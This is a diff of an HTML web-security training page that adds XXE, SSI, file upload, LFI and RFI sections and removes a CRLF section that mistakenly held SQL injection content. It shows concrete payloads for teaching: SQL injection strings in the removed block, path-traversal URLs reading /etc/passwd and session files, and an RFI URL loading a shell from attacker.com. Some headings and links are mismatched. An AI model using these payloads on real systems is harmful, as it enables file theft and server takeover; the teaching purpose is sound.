@@ -480,11 +480,17 @@
             <li><a href="#cross-origin-resource-sharing" class="active"><i class="fas fa-chevron-right"></i>Cross-Origin Resource Sharing</a></li>                                         
             <li><a href="#sql-injection" class="active"><i class="fas fa-chevron-right"></i>SQL Injection</a></li>
             <li><a href="#html-injection" class="active"><i class="fas fa-chevron-right"></i>HTML Injection</a></li>
-            <li><a href="#crlf-injection" class="active"><i class="fas fa-chevron-right"></i>CRLF Injection</a></li>
+            <li><a href="#xml-injection" class="active"><i class="fas fa-chevron-right"></i>XML External Entity (XXE) Injection</a></li>
+            <li><a href="#ssi-injection" class="active"><i class="fas fa-chevron-right"></i>Server-Side Includes (SSI)</a></li>
             <li><a href="#server-side-request-forgery" class="active"><i class="fas fa-chevron-right"></i>Server-Side Request Forgery (SSRF)</a></li>
-            
-            <li><a href="#security-headers" class="active"><i class="fas fa-chevron-right"></i> Security Headers</a></li>
             <li><a href="#file-upload"><i class="fas fa-chevron-right"></i> File Upload Security</a></li>
+            <li><a href="#local-file-inclusion"><i class="fas fa-chevron-right"></i> Local File Inclusion</a></li>
+            <li><a href="#remote-file-inclusion"><i class="fas fa-chevron-right"></i> Remote File Inclusion</a></li>
+
+            
+            
+
+            <li><a href="#security-headers" class="active"><i class="fas fa-chevron-right"></i> Security Headers</a></li>
             <li><a href="#secure-cookies"><i class="fas fa-chevron-right"></i> Secure Cookies</a></li>
             <li><a href="#local-storage"><i class="fas fa-chevron-right"></i> Local Storage Security</a></li>
             <li><a href="#vulnerable-components"><i class="fas fa-chevron-right"></i> Vulnerable Components</a></li>
@@ -1157,7 +1163,7 @@ cmd.Parameters.AddWithValue("@id", id);
         </div>
 
 
-                <!-- Topic 8: HTML Injection -->
+        <!-- Topic 8: HTML Injection -->
             <div id="html-injection" class="topic-card">
                 <div class="topic-header">
                     <div class="topic-icon">
@@ -1234,134 +1240,141 @@ cmd.Parameters.AddWithValue("@id", id);
         </div>
 
 
-    <!-- Topic 9: CRLF Injection -->
-            <div id="crlf-injection" class="topic-card">
+        <!-- Topic 9: XXE Injection -->
+            <div id="xml-injection" class="topic-card">
                 <div class="topic-header">
                     <div class="topic-icon">
                         <i class="fas fa-file-upload"></i>
                     </div>
-                    <h2>9. CRLF Injection</h2>
+                    <h2>9. XML External Entity (XXE) Injection</h2>
                 </div>
                 
-                <h3>🧩 CRLF Injection:</h3>
-                <p>SQL Injection (SQLi) is a vulnerability that happens when an application builds a database query using untrusted user input without safely handling it. An attacker supplies crafted input that changes the intended SQL statement, allowing them to read, modify, or destroy data — or sometimes execute commands on the database server.</p>
-                <div class="example-box">
-                    <h3>Main types of SQL Injection (simple descriptions + what they let an attacker do)</h3>
-                    <b>1. In-band SQLi (Classic)</b>
-                    <p><b>Union-based:</b> attacker uses UNION to append attacker-controlled query results to the app’s results.</p>
-                    <p><b>Error-based:</b> attacker forces database errors that reveal data.</p>
-                    <p><b>When used:</b> when application returns query results or error messages directly.</p>
-                    <b>2. Inferential (Blind) SQLi</b>
-                    <p><b>Boolean-based (content-based) blind:</b> attacker sends queries that return different page content depending on a true/false condition; attacker infers data.</p>
-                    <p><b>Time-based blind:</b> attacker forces a delay (e.g., SLEEP) to infer true/false from response time.</p>
-                    <p><b>When used:</b> when the app does not return query output or errors.</p>
-                    <b>3. Out-of-band (OOB) SQLi</b>
-                    <p>Uses DB features to make outbound requests (DNS/HTTP) to attacker-controlled servers to exfiltrate data.</p>
-                    <p><b>When used:</b> when direct or blind channels are blocked but outbound network from DB is allowed.</p>
-                    <b>4. Second-order SQLi</b>
-                    <p>Malicious input is stored safely at entry but later used unsafely (concatenated into SQL) in another operation; exploit happens later.</p>
+                <h3>🧩 XML External Entity (XXE) Injection</h3>
+                <p>An XXE (XML External Entity) vulnerability occurs when an application processes untrusted XML input and allows attackers to inject malicious XML entities. This can lead to sensitive file disclosure, denial of service, SSRF (Server-Side Request Forgery), or even remote code execution. The fix is to disable external entity processing in XML parsers and validate all XML input.</p>
+                <p>XML External Entity (XXE) Injection is a vulnerability in applications that parse XML.</p>
+                <p>XML allows defining entities (shortcuts for data). If external entities are enabled, attackers can reference local files or remote resources.</p>
+                <p>Example of a malicious XML payload:</p>
+                <img src="Images/XXE-1.png" width="750" height="180">
+                <p>Here, the entity &xxe; will include the contents of /etc/passwd.</p>
+
                 <div class="warning-box">
-                    <h3>💥 Impact of the Issue</h3>
-                    <p><b>Data theft:</b> user data, PII, credit cards, internal tables.</p>
-                    <p><b>Authentication bypass:</b> log in as other users.</p>
-                    <b>Data tampering or deletion.</b>
-                    <p><b>Remote code execution / server compromise</b> (possible with certain DB features).</p>
-                    <p><b>Lateral movement:</b> obtain DB credentials and pivot to internal systems.</p>
-                    <p><b>Service outage / DoS</b> via expensive queries.</p>
-                    <p>Compliance, financial & reputation damage.</p>
+                    <h3>💥 Impact of XXE</h3>
+                    <p><b>Sensitive File Disclosure:</b> Read files like /etc/passwd, configuration files, or API keys.</p>
+                    <p><b>Server-Side Request Forgery (SSRF):</b> Force the server to make requests to internal systems.</p>
+                    <p><b>Denial of Service (DoS):</b> Use recursive entities (the “Billion Laughs” attack) to exhaust memory/CPU.</p>
+                    <p><b>Remote Code Execution (in some cases):</b> If combined with other flaws, attackers may execute arbitrary code.</p>
+                    <p><b>Data Exfiltration:</b> Steal credentials, tokens, or internal documents.</p>
                 </div>
                 
                 <div class="attack-scenario-box">
-                    <h3>🧪 Attack scenarios and examples — one per type (concrete payloads & explanation)</h3>
-                    <p>Example vulnerable pattern used in several scenarios:</p>
-<pre>
--- vulnerable pseudo-code
-query = "SELECT * FROM products WHERE id = " + user_input;
-</pre>
-                    <b>1. In-band — UNION-based (data extraction)</b>
-                    <p><b>Scenario:</b> Product page shows query results from products.</p>
-                    <p><b>Attack payload:</b> id=10 UNION SELECT 1, username, password FROM users-- -</p>
-                    <p><b>What happens:</b> The app’s response now includes rows from users because UNION appends results.</p>
-                    <p><b>Goal:</b> Harvest usernames, hashes, emails.</p>
-                    <p><b>Prevention:</b> Use parameterized queries; never build SQL by concatenating user input.</p>
-                    <p>Safe replacement example (Node.js, mysql2):</p>
-<pre>
-const [rows] = await conn.execute('SELECT * FROM products WHERE id = ?', [id]);
-</pre>
-                    <p>2. In-band — Error-based (reveal metadata)</p>
-                    <p><b>Scenario:</b> App displays DB error messages in responses (development-like behavior).</p>
-                    <b>Attack payload (MySQL-like):</b>
-<pre>
-' OR (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a) -- -
-</pre>
-                    <p><b>What happens:</b> Crafted subquery induces a DB error containing the concatenated data (e.g., DB name); attacker reads the error.</p>
-                    <p><b>Goal:</b> Learn DB name, structure, craft further attacks.</p>
-                    <p><b>Prevention:</b> Hide DB errors from users; parameterize queries; limit error detail.</p>
-                    <p>3. Inferential — Boolean-based blind (bit-by-bit extraction)</p>
-                    <p><b>Scenario: App returns identical page for many inputs and shows no errors.</b></p>
-                    <p><b>Attack method: Send queries that return different page content when a condition is true.</b></p>
-                    <b>Example payload to test first character of admin’s password:</b>
-<pre>
-?id=1 AND (SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a')
-</pre>
-                    <p>If response indicates true, attacker knows first character is a. Repeat for every character and position.</p>
-                    <p><b>Goal:</b> Recover password hash or other values without direct output.</p>
-                    <p><b>Prevention:</b> Parameterized queries, least privilege, rate limiting, monitoring.</p>
-                    <b>4. Inferential — Time-based blind (using delay)</b>
-                    <p><b>Scenario:</b> App response body is constant, but response time can reveal truth.</p>
-                    <b>Attack payload (MySQL):</b>
-<pre>
-?id=1 AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))=97, SLEEP(5), 0) -- -
-</pre>
-                    <p>If response is delayed ~5s, first character is a. Repeat to extract values.</p>
-                    <p><b>Goal:</b> Same as boolean-blind, but via timing.</p>
-                    <p><b>Prevention:</b> Parameterized queries; detect unusual repeated delayed responses; block long-running queries.</p>
-                    <b>5. Out-of-band (OOB) — DNS/HTTP exfiltration</b>
-                    <p><b>Scenario:</b> DB server can perform network requests (DNS/HTTP) and attacker controls a domain attacker.com.</p>
-                    <p><b>Attack idea (conceptual):</b> Use a DB function to cause a DNS lookup to secret.[exfil].attacker.com where secret is data from the DB. Attack monitors DNS logs and captures the secret.</p>
-                    <p><b>Concrete functions vary by DB:</b> e.g., xp_dirtree/xp_cmdshell on SQL Server, UTL_HTTP on Oracle, DNS functions or LOAD_FILE/LOCAL INFILE combos on MySQL (or user-defined functions).</p>
-                    <p><b>Goal:</b> Exfiltrate data when in-band channels are closed.</p>
-                    <p><b>Prevention:</b> Disable outbound DNS/HTTP from DB servers, restrict DB functions, network egress filtering, least privilege.</p>
-                    <b>6. Second-order SQLi (stored payload triggers later)</b>
-                    <p><b>Scenario:</b> User inputs a profile bio that contains '); DROP TABLE users; -- and it is stored. Later, the application builds an admin query by concatenating that stored bio into SQL; the stored malicious string then executes.</p>
-                    <p><b>Attack flow:</b> Input is stored -> later used in unsafe SQL -> SQL executes.</p>
-                    <p><b>Goal:</b> Attack high-privilege operations via stored input.</p>
-                    <p><b>Prevention:</b> Always treat stored data as untrusted; use parameterized queries everywhere; code review for any place that reads stored values into SQL.</p>
-                    <h3>Quick code examples — safe patterns</h3>
-<b>PHP (PDO)</b>
-<pre>
-$stmt = $pdo->prepare('SELECT id, name FROM users WHERE id = :id');
-$stmt->execute([':id' => $id]);
-</pre>
-<b>Python (psycopg2)</b>
-<pre>cur.execute("SELECT id, name FROM users WHERE id = %s", (user_id,))</pre>
-<b>Node.js (mysql2/promise)</b>
-<pre>const [rows] = await conn.execute('SELECT * FROM users WHERE id = ?', [id]);</pre>
-<b>C# (ADO.NET)</b>
-<pre>
-var cmd = new SqlCommand("SELECT * FROM users WHERE id=@id", conn);
-cmd.Parameters.AddWithValue("@id", id);
-</pre>
+                    <h3>🎯 Attack Scenarios</h3>
+                    <b>1. File Disclosure Attack</b>
+                    <p>Attacker submits XML referencing /etc/passwd → server returns sensitive system data.</p>
+                    <b>SSRF via XXE</b>
+                    <img src="Images/XXE-2.png" width="750" height="60">
+                    <p>Forces the server to fetch internal resources attackers can’t normally access.</p>
+                    <b>Denial of Service (Billion Laughs Attack)</b>
+                    <img src="Images/XXE-3.png" width="750" height="180">
+                    <p>Expands exponentially, crashing the server.</p>
                 </div>
 
                 <div class="remediation-box">
                     <h3>🛠 Remediation</h3>
-                    <p></p><b>1. Use parameterized queries / prepared statements</b> (primary defense).</p>
-                    <p><b>2. Use strong password hashing</b> (bcrypt/Argon2) — never store plaintext.</p>
-                    <p><b>3. Principle of least privilege:</b> DB account used by the app should have only necessary rights.</p>
-                    <p><b>4. Input validation with allowlists</b> (type/format/length) — helpful but not sufficient.</p>
-                    <p><b>5. Avoid dynamic SQL and string concatenation; </b>if you must build identifiers dynamically, use strict allowlists/whitelists.</p>
-                    <p><b>6. Suppress detailed DB errors to users;</b> log internally.</p>
-                    <p><b>7. Disable or restrict dangerous DB features</b> (e.g., external network access, xp_cmdshell, UDFs) where possible.</p>
-                    <p><b>8. Automated + manual security testing (authorized):</b> include SQLi tests in CI or pentests.</p>
-                    <p><b>9. Monitor & alert</b> for anomalous queries, slow queries, or unexpected outbound DNS/HTTP from DB.</p>
+                    <b>1. Disable External Entities</b>
+                    <p>In XML parsers, disable DOCTYPE and external entity resolution.</p>
+                    <p>Example (Java):</p>
+<pre>
+factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
+</pre>
+                    <b>2. Use Secure Parsers</b>
+                    <p>Prefer modern libraries that are secure by default (e.g., defusedxml in Python).</p>
+                    <b>3. Input Validation</b>
+                    <p>Accept only expected XML structures.</p>
+                    <p>Reject or sanitize untrusted XML input.</p>
+                    <b>4. Least Privilege</b>
+                    <p>Run applications with minimal file and network permissions.</p>
+                    <b>5. Regular Security Testing</b>
+                    <p>Include XXE checks in penetration tests and code reviews.</p>
                 </div>
 
                 <h3>📚 Reference Links:</h3>
-                <p><a href="https://owasp.org/www-community/attacks/SQL_Injection">https://owasp.org/www-community/attacks/SQL_Injection</a></p>
-                <p><a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html</a></p>
-                <p><a href="https://cwe.mitre.org/data/definitions/89.html">https://cwe.mitre.org/data/definitions/89.html</a></p>
-                <p><a href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a></p>
+                <p><a href="https://www.indusface.com/blog/how-to-identify-and-mitigate-xxe-vulnerability/">https://www.indusface.com/blog/how-to-identify-and-mitigate-xxe-vulnerability/</a></p>
+                <p><a href="https://portswigger.net/web-security/xxe">https://portswigger.net/web-security/xxe</a></p>
+                <p><a href="https://www.imperva.com/learn/application-security/xxe-xml-external-entity/">https://www.imperva.com/learn/application-security/xxe-xml-external-entity/</a></p>
+            </div>
+        </div>
+
+    <!-- Topic 10: SSI Injection -->
+        <div id="ssi-injection" class="topic-card">
+                <div class="topic-header">
+                    <div class="topic-icon">
+                        <i class="fas fa-file-upload"></i>
+                    </div>
+                    <h2>9. Server-Side Includes (SSI)</h2>
+                </div>
+                
+                <h3>🧩 Server-Side Includes (SSI):</h3>
+                <p>Server-Side Includes (SSI) are simple directives embedded in web pages (e.g. <!--#include ...-->, <!--#echo ...-->) that the web server evaluates before sending the page. SSI injection occurs when untrusted user input is allowed into content that the server will parse for SSI directives — letting an attacker make the server evaluate attacker-controlled SSI. That can lead to information disclosure, file inclusion, or in extreme cases execution of server-side commands depending on server configuration.</p>
+            <div class="example-box">
+                    <h3>🎯 Examples — safe, non-exploitative</h3>
+                    <p>Vulnerable pattern (conceptual — do not use in production):</p>
+                    <img src="Images/SSI-1.png" width="750" height="130">
+                    <p>Safer pattern (use allowlist + server-side rendering):</p>
+                    <img src="Images/SSI-2.png" width="750" height="170">
+                    <p>Or avoid server-side SSI processing entirely and render templates in your application language with proper escaping.</p>
+                    <p>Disable SSI in Apache for a directory</p>
+                    <img src="Images/SSI-3.png" width="750" height="170">
+                    <p>Allow includes but disable exec (Apache)</p>
+                    <img src="Images/SSI-4.png" width="750" height="200">
+                    <p>Allowlist pattern (application pseudocode)</p>
+                    <img src="Images/SSI-5.png" width="750" height="350">
+
+                <div class="warning-box">
+                    <h3>💥 Impact of the Issue</h3>
+                    <p><b>Information disclosure</b> — attacker can cause inclusion of local files (config files, credentials, etc.).</p>
+                    <p><b>Local file inclusion</b> — sensitive files under the web server’s view may be exposed.</p>
+                    <p><b>Remote content inclusion / defacement </b>— attacker causes the site to include content from other locations.</p>
+                    <p><b>Command execution</b> — if SSI supports execution (e.g., exec) and it’s enabled, attacker may run commands (very high severity).</p>
+                    <p><b>Stored attacks</b> — malicious SSI saved in a database or comment that gets processed later (affects other users).</p>
+                    <p><b>Trust erosion / phishing</b> — site serves attacker-controlled content to real users.</p>
+                </div>
+                
+                <div class="attack-scenario-box">
+                    <h3>🧪 Attack scenarios</h3>
+                    <b>1. Dynamic include path controlled by user</b>
+                    <img src="Images/SSI-7.png" width="750" height="70">
+                    <b>2. Stored SSI payload</b>
+                    <p>User-submitted content (comments, profile fields) is saved and later served inside a page processed for SSI. The saved payload executes when other users request the page.</p>
+                    <b>3. Abuse of exec functionality</b>
+                    <p>If the server’s include module allows command execution and untrusted data ends up in those directives, an attacker may run system commands.</p>
+                    <b>4. Cross-file contamination</b>
+                    <p>An attacker causes inclusion of a crafted fragment (hosted somewhere they control), which then runs in the context of the victim site (defacement, credential theft).</p>
+                </div>
+
+                <div class="remediation-box">
+                    <h3>🛠 Remediation</h3>
+                    <b>1. Disable SSI unless required.</b>
+                    <p>If you don’t need it, turn off server SSI processing (e.g., remove Options Includes or avoid registering .shtml).</p>
+                    <b>2. If SSI is required, disable dangerous features.</b>
+                    <p>Use an option that forbids command execution (for example, prefer IncludesNOEXEC in Apache over full Includes) so exec functionality is disabled.</p>
+                    <b>3. Never place raw user input into SSI contexts.</b>
+                    <p>Do not write user-supplied content into files that will be processed for SSI. Escape or neutralize SSI delimiters " <, ! , - , # " before writing untrusted content to files that might be processed.</p>
+                    <b>4. Use allowlists for any include choices.</b>
+                    <p>Map user choices to fixed file paths managed by you. Do not accept arbitrary file paths or URLs from users.</p>
+                    <b>5. Least privilege and separation.</b>
+                    <p>Ensure the web server account cannot read sensitive files; keep configs and secrets outside the document root.</p>
+                    <b>6. Logging and monitoring.</b>
+                    <p>Monitor for unusual include directives, requests for internal files, and logs showing SSI patterns where they shouldn’t be.</p>
+                    <b>7. Patch & harden</b>
+                    <p>Keep web server modules up to date and follow vendor hardening guides.</p>
+                    <b>8. Output encoding / escaping for SSI context</b>
+                    <img src="Images/SSI-6.png" width="750" height="70">
+                </div>
+
+                <h3>📚 Reference Links:</h3>
+                <p><a href="https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server_Side_Template_Injection">https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server_Side_Template_Injection</a></p>
+                <p><a href="https://www.imperva.com/learn/application-security/server-side-template-injection-ssti/">https://www.imperva.com/learn/application-security/server-side-template-injection-ssti/</a></p>
+                <p><a href="https://portswigger.net/web-security/server-side-template-injection">https://portswigger.net/web-security/server-side-template-injection</a></p>
             </div>
         </div>
 
@@ -1393,6 +1406,7 @@ cmd.Parameters.AddWithValue("@id", id);
                     <p><b>When used:</b> when direct or blind channels are blocked but outbound network from DB is allowed.</p>
                     <b>4. Second-order SQLi</b>
                     <p>Malicious input is stored safely at entry but later used unsafely (concatenated into SQL) in another operation; exploit happens later.</p>
+
                 <div class="warning-box">
                     <h3>💥 Impact of the Issue</h3>
                     <p><b>Server-side data disclosure</b> — internal-only endpoints (APIs, admin consoles) can leak secrets.</p>
@@ -1547,6 +1561,200 @@ def safe_fetch(url):
                 <p><a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html">https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html</a></p>
             </div>
         </div>
+    
+        <!-- Topic 11: File Upload Vulnerability -->
+            <div id="file-upload" class="topic-card">
+                <div class="topic-header">
+                    <div class="topic-icon">
+                        <i class="fas fa-file-upload"></i>
+                    </div>
+                    <h2>11. File Upload Vulnerability</h2>
+                </div>
+                
+                <h3>📌 File Upload Vulnerability</h3>
+                <p>A File Upload Vulnerability occurs when a web application lets users upload files without properly validating them. Attackers can exploit this to upload malicious scripts, malware, or executables, leading to server compromise, data theft, or full system takeover. The fix is to strictly validate file types, restrict upload locations, and never execute uploaded files.</p>
+                <p>Many websites allow users to upload files (profile pictures, documents, videos, etc.).</p>
+                <p>If the application doesn’t check file type, size, or content properly, attackers can upload harmful files.</p>
+                <p>Example: Instead of a .jpg image, an attacker uploads a .php web shell that executes commands on the server.</p>
+
+                <h3>✅ How is File Validation Used?</h3>
+                <p>File validation is the process of checking uploaded files to ensure they conform to expected criteria such as:</p>
+                <p><b>File type validation:</b> Confirming the file extension and MIME type match allowed types (e.g., .jpg, .png, .pdf).</p>
+                <p><b>File size validation:</b> Enforcing size limits to prevent resource exhaustion.</p>
+                <p><b>File content validation:</b> Optionally inspecting file contents to detect malicious code.</p>
+                <p><b>Filename sanitization:</b> Removing or restricting harmful characters to prevent path traversal or injection.</p>
+                <p><b>Storage location control:</b> Ensuring uploaded files are stored in secure, non-executable directories.</p>
+                
+                <div class="warning-box">
+                    <h3>⚠️ Impact of File Upload Vulnerabilities</h3>
+                    <p><b>Remote Code Execution (RCE):</b> Attackers can upload and execute malicious scripts on the server.</p>
+                    <p><b>Malware Distribution:</b> The system can become a source for spreading malware.</p>
+                    <p><b>Denial of Service (DoS):</b> Uploading very large or numerous files can exhaust server resources.</p>
+                    <p><b>Data Breach or Defacement:</b> Malicious files may lead to data leaks or unauthorized site modification.</p>
+                    <p><b>Unauthorized Access:</b> Exploiting uploaded files to escalate privileges.</p>
+                </div>
+
+                <div class="attack-scenario-box">
+                    <h3>🎯 Examples & Attack Scenarios</h3>
+                    <b>1. Web Shell Upload</b>
+                    <p>Attacker uploads shell.php disguised as image.jpg.php.</p>
+                    <p>Visiting http://example.com/uploads/shell.php gives them remote control of the server.</p>
+                    <b>2. Malware Distribution</b>
+                    <p>Uploading a malicious .exe file that unsuspecting users download and run.</p>
+                    <b>3. Bypassing Filters</b>
+                    <p>Attackers rename malware.php to malware.php.jpg to bypass weak extension checks.</p>
+                    <b>4. Path Traversal in Uploads</b>
+                    <p>Uploading a file with ../../evil.php in its name to place it in a sensitive directory.</p>
+                </div>
+                
+                <div class="remediation-box">
+                    <h3>🛠️ Remediation of the Issue</h3>
+                    <p>1. Strictly validate file type and MIME type to accept only known safe formats.</p>
+                    <p>2. Enforce file size limits to control resource use.</p>
+                    <p>3. Sanitize file names or generate safe random names.</p>
+                    <p>4. Store uploaded files outside the web root to prevent direct execution.</p>
+                    <p>5. Scan uploaded files with antivirus/malware scanners if possible.</p>
+                    <p>6. Implement authentication and authorization for upload endpoints.</p>
+                    <p>7. Log upload activity to detect suspicious behavior.</p>
+                </div>
+                
+                <h3>📚 Reference Links:</h3>
+                <p><a href="https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload">https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload</a></p>
+                <p><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Methods/POST#uploading_files">https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Methods/POST#uploading_files</a></p>
+                <p><a href="https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html</a></p>
+            </div>
+
+        <!-- Topic 12: Local File Inclusion (LFI) -->
+            <div id="local-file-inclusion" class="topic-card">
+                <div class="topic-header">
+                    <div class="topic-icon">
+                        <i class="fas fa-file-upload"></i>
+                    </div>
+                    <h2>12. Local File Inclusion (LFI)</h2>
+                </div>
+                
+                <h3>📌 Local File Inclusion (LFI)</h3>
+                <p>A Local File Inclusion (LFI) vulnerability happens when a web application allows user input to specify files that the server loads, without proper validation. Attackers can exploit this to read sensitive files, expose source code, or even achieve remote code execution. The fix is to sanitize user input, restrict file access, and use secure coding practices.</p>
+                <p>Local File Inclusion (LFI) occurs when a web app dynamically includes files based on user input.</p>
+                <p>If the input isn’t validated, attackers can trick the server into loading unexpected files from its local filesystem.</p>
+                <p>Example vulnerable PHP code:</p>
+                <img src="Images/LFI-1.png" width="750" height="140">
+                <p>If a user requests ?page=../../etc/passwd, the server may expose sensitive system files.</p>
+
+                <div class="warning-box">
+                    <h3>⚠️ Impact of LFI</h3>
+                    <p><b>Sensitive File Disclosure:</b> Attackers can read files like /etc/passwd, configuration files, or logs.</p>
+                    <p><b>Source Code Exposure:</b> Application code (e.g., config.php) may be revealed, leaking database credentials.</p>
+                    <p><b>Authentication Bypass:</b> Session or cookie files could be included to hijack sessions.</p>
+                    <p><b>Remote Code Execution (RCE):</b> When combined with file upload or log poisoning, attackers can execute arbitrary code.</p>
+                    <p><b>Privilege Escalation:</b> If chained with other vulnerabilities, attackers may gain full server control.</p>
+                </div>
+
+                <div class="attack-scenario-box">
+                    <h3>🎯 Examples & Attack Scenarios</h3>
+                    <b>File Disclosure</b>
+<pre>
+http://example.com/index.php?page=../../../../etc/passwd
+</pre>
+                    <p>Reveals system user accounts.</p>
+                    <b>Source Code Exposure</b>
+<pre>
+http://example.com/index.php?page=../../config.php
+</pre>
+                    <p>Exposes database credentials.</p>
+                    <b>Log Poisoning to RCE</b>
+                    <p>Attacker injects PHP code into server logs (e.g., via User-Agent header).</p>
+                    <p>Then includes the log file via LFI to execute the code.</p>
+                    <b>Session Hijacking</b>
+<pre>
+http://example.com/index.php?page=../../../../tmp/sess_abcd1234
+</pre>
+                    <p>Reads session files to impersonate users.</p>
+                </div>
+                
+                <div class="remediation-box">
+                    <h3>🛠️ Remediation of the Issue</h3>
+                    <b>1. Input Validation & Whitelisting</b>
+                    <p>Only allow predefined, safe file names.</p>
+                    <p>Never trust user input for file paths.</p>
+                    <b>2. Disable Dangerous Functions</b>
+                    <p>In PHP, disable include, require, or allow_url_include where not needed.</p>
+                    <b>3. Use Path Restrictions</b>
+                    <p>Implement a chroot jail or restrict file access to specific directories.</p>
+                    <b>4. Error Handling</b>
+                    <p>Don’t reveal detailed error messages that expose file paths.</p>
+                    <b>5. Least Privilege</b>
+                    <p>Run the web server with minimal permissions to limit damage.</p>
+                </div>
+                
+                <h3>📚 Reference Links:</h3>
+                <p><a href="https://brightsec.com/blog/lfi-attack-real-life-attacks-and-attack-examples/">https://brightsec.com/blog/lfi-attack-real-life-attacks-and-attack-examples/</a></p>
+                <p><a href="https://www.valencynetworks.com/kb/local-file-inclusion-lfi-vulnerability-risks-impact-and-fixation.html">https://www.valencynetworks.com/kb/local-file-inclusion-lfi-vulnerability-risks-impact-and-fixation.html</a></p>
+                <p><a href="https://techtalkpine.com/2025/03/lfi-demo/">https://techtalkpine.com/2025/03/lfi-demo/</a></p>
+            </div>
+
+        <!-- Topic 13: Remote File Inclusion (RFI) -->
+            <div id="remote-file-inclusion" class="topic-card">
+                <div class="topic-header">
+                    <div class="topic-icon">
+                        <i class="fas fa-file-upload"></i>
+                    </div>
+                    <h2>13. Remote File Inclusion (RFI)</h2>
+                </div>
+                
+                <h3>📌 Remote File Inclusion (RFI)</h3>
+                <p>A Remote File Inclusion (RFI) vulnerability happens when a web application loads files based on user input without proper validation, allowing attackers to include and execute malicious files from remote servers. This can lead to remote code execution, data theft, or full server compromise. The fix is to disable remote file inclusion, validate inputs, and restrict file access.</p>
+                <p>It occurs when a web app dynamically includes files (e.g., PHP include() or require()) using user-supplied input.</p>
+                <p>If input isn’t sanitized, attackers can point the application to a remote malicious file hosted on their server.</p>
+                <p>Example vulnerable PHP code:</p>
+                <img src="Images/RFI-1.png" width="750" height="250">
+                <p>The malicious script from evil.com will run on the server.</p>
+                
+                <div class="warning-box">
+                    <h3>⚠️ Impact of RFI</h3>
+                    <p><b>Remote Code Execution (RCE):</b> Attackers can run arbitrary code on the server.</p>
+                    <p><b>Server Takeover:</b> Full control of the web server if it runs with high privileges.</p>
+                    <p><b>Website Defacement:</b> Injecting malicious content into web pages.</p>
+                    <p><b>Data Theft:</b> Access to sensitive files, databases, or credentials.</p>
+                    <p><b>Pivoting:</b>Using the compromised server to attack internal networks.</p>
+                </div>
+
+                <div class="attack-scenario-box">
+                    <h3>🎯 Attack Scenarios</h3>
+                    <b>1. Remote Shell Upload</b>
+                    <p>Attacker hosts a malicious PHP file (shell.php) on their server.</p>
+                    <p>Victim site includes it via:</p>
+<pre>
+http://victim.com/index.php?page=http://attacker.com/shell.php
+</pre>
+                    <p>Now the attacker can execute commands remotely.</p>
+                    <b>2. Malware Injection</b>
+                    <p>RFI is used to load a remote script that steals cookies or injects malware into pages.</p>
+                    <b>3. Botnet Recruitment</b>
+                    <p>Compromised servers can be forced to download and run scripts that make them part of a botnet.</p>
+                </div>
+                
+                <div class="remediation-box">
+                    <h3>🛠️ Remediation</h3>
+                    <b>1. Disable Remote File Inclusion</b>
+                    <p>In PHP, set allow_url_include=Off and allow_url_fopen=Off.</p>
+                    <b>2. Input Validation & Whitelisting</b>
+                    <p>Only allow predefined, safe file names.</p>
+                    <p>Never let users directly control file paths.</p>
+                    <b>3. Use Secure Coding Practices</b>
+                    <p>Replace dynamic includes with static mappings.</p>
+                    <p>Avoid using include() or require() with user input.</p>
+                    <b>4. Least Privilege</b>
+                    <p>Run the web server with minimal permissions.</p>
+                    <b>5. Error Handling</b>
+                    <p>Hide detailed error messages that may reveal file paths.</p>
+                </div>
+                
+                <h3>📚 Reference Links:</h3>
+                <p><a href="https://www.imperva.com/learn/application-security/rfi-remote-file-inclusion/">https://www.imperva.com/learn/application-security/rfi-remote-file-inclusion/</a></p>
+                <p><a href="https://zerothreat.ai/blog/remote-file-inclusion-the-security-threat-you-might-be-ignoring">https://zerothreat.ai/blog/remote-file-inclusion-the-security-threat-you-might-be-ignoring</a></p>
+                <p><a href="https://letsdefend.io/blog/how-to-detect-lfi-and-rfi-attacks">https://letsdefend.io/blog/how-to-detect-lfi-and-rfi-attacks</a></p>
+            </div>
 
 
             <!-- Topic 15: Security Headers -->
@@ -1555,7 +1763,7 @@ def safe_fetch(url):
                     <div class="topic-icon">
                         <i class="fas fa-heading"></i>
                     </div>
-                    <h2>1. Implementing security headers for Web application</h2>
+                    <h2>15. Security headers for Web application</h2>
                 </div>
                 
                 <h3>📌Content Security Policy (CSP):</h3><p>It is a security feature that helps prevent Cross-Site Scripting (XSS), clickjacking, and other code injection attacks by controlling which resources (scripts, styles, images, etc.) the browser is allowed to load and execute.</p>
@@ -1829,91 +2037,7 @@ location /index.html {
                 <p><a href="https://nginx.org/en/docs/http/ngx_http_headers_module.html#add_header">https://nginx.org/en/docs/http/ngx_http_headers_module.html#add_header</a></p>
             </div>
 
-            <!-- Topic 2: File Upload Security -->
-            <div id="file-upload" class="topic-card">
-                <div class="topic-header">
-                    <div class="topic-icon">
-                        <i class="fas fa-file-upload"></i>
-                    </div>
-                    <h2>2. Unrestricted File Upload</h2>
-                </div>
-                
-                <h3>📌 What is Unrestricted File Upload?</h3>
-                <p>Unrestricted File Upload is a security vulnerability where an application allows users to upload files without properly validating or restricting the file types, sizes, or content. This can enable attackers to upload malicious files (e.g., web shells, scripts, executables) that could be executed on the server or delivered to other users, potentially compromising the system.</p>
-                
